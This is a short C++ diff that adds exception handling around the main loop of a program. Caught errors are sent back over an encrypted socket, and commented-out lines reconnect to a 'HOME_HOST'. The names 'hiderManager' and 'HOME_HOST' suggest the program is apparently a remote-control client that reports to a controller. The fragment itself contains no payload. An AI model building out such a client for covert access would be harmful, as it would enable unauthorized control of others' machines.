@@ -35,7 +35,14 @@ int main() {
     bool cont = true;
     while (cont)
     {
-        loopIter(conn, swm, hiderManager);
+        try {
+            loopIter(conn, swm, hiderManager);
+        } catch (const std::exception& e) {
+            // Handle the exception
+            std::cerr << "Exception caught: " << e.what() << std::endl;
+            const std::string err(e.what());
+            conn->sendResponce(ERROR_FROM_UNKNOWN_SOURCE, err);
+        }
         std::cout << "compleated loop iter\n";
         // if (conn->checkShutdown()) {
         //     if (EncSocketConnection::connectEncTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
